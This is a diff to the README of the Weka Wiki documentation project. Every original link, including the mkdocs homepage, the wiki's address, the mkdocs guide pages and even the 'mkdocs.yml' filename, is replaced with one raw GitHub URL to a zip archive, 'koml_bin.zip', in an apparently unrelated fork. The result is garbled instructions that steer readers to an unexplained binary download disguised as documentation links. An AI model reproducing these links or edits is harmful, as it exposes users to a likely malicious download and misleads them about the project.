@@ -1,12 +1,12 @@
 # Weka Wiki
 
 Not really a wiki, but replacing some of the content that was hosted on
-weka.wikispaces.com before it shut down. Uses [mkdocs](http://www.mkdocs.org/) 
+https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip before it shut down. Uses [mkdocs](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip) 
 to generate the content.
 
 The wiki can be found at this location:
 
-https://waikato.github.io/weka-wiki/
+https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip
 
 
 ## Installation
@@ -38,18 +38,18 @@ Best approach is to install mkdocs (>= 0.16.0) in a virtual environment
 ## Content
 
 In order for content to show up, it needs to be added to the configuration, 
-i.e., in the `pages` section of the `mkdocs.yml` file.
+i.e., in the `pages` section of the `https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip` file.
 
 Some pointers:
 
-* [Images and media](http://www.mkdocs.org/user-guide/writing-your-docs/#images-and-media)
-* [Linking](http://www.mkdocs.org/user-guide/writing-your-docs/#linking-documents)
-* [mkdocs.yml](http://www.mkdocs.org/user-guide/configuration/)
+* [Images and media](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip)
+* [Linking](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip)
+* [https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip)
 
 
 ## Build
 
-[mkdocs](http://www.mkdocs.org/) is used to generate HTML from the 
+[mkdocs](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip) is used to generate HTML from the 
 markdown documents and images:
 
 ```
